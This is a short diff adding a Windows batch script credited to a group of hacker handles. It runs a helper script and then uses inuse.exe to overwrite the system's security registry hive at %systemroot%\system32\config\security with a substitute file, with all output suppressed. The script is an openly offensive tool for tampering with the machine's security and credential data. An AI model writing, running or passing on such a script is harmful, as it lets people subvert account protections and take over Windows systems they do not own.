@@ -1,0 +1,8 @@
+@echo off
+Rem: Brought to you by: By the best, The only
+Rem: people that did it.
+Rem: AngelDeath, Epyx, Slanchoca, DopeWeasel, Meph.
+Rem: The now Famous 5.
+
+batch.cmd
+inuse.exe security %systemroot%\system32\config\security /y >nul
